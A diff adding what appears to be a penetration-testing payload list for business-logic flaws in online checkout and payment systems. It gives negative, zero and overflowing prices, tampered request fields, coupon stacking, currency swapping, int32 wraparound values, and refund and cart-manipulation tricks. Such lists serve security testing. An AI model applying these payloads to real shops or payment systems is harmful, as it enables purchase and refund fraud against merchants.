@@ -1,0 +1,57 @@
+# ============================================================
+# Business Logic — Price & Payment Manipulation
+# ============================================================
+
+# ---- Negative Price ----
+{"price": -100}
+{"amount": -1}
+{"quantity": -1}
+{"discount": 110}
+
+# ---- Zero Price ----
+{"price": 0}
+{"price": 0.00}
+{"amount": 0}
+
+# ---- Overflow Price ----
+{"price": 99999999999999}
+{"price": 9.99e308}
+{"price": 1e-10}
+
+# ---- Modify Price in Request ----
+# Intercept checkout request, change:
+item_price=0.01
+total=0
+price_cents=1
+
+# ---- Coupon Abuse ----
+# Stack multiple coupons
+coupon1=SAVE10&coupon2=SAVE20
+# Reuse expired coupon
+# Apply coupon after discount already applied
+# Negative coupon: coupon=-100 (increases discount beyond 100%)
+
+# ---- Currency Confusion ----
+# Change currency code in request
+currency=USD → currency=VND (Vietnam Dong, ~25x cheaper)
+currency=JPY
+{"amount": 100, "currency": "JPY"}  (100 JPY ≈ $0.67)
+
+# ---- Integer Overflow / Wrap ----
+# If price stored as int32: 2147483648 wraps to -2147483648
+{"price": 2147483648}
+{"quantity": 2147483648}
+
+# ---- Free Shipping Exploitation ----
+# Add items to reach free shipping threshold, then remove items
+# Race condition on shipping recalculation
+
+# ---- Refund Manipulation ----
+# Request refund for higher amount than paid
+# Refund after using/consuming digital goods
+# Multiple refunds for same order
+
+# ---- Cart Manipulation ----
+# Change item ID to expensive item, keep original price
+{"item_id": "premium-item", "price": 0.01}
+# Duplicate item in cart via race condition
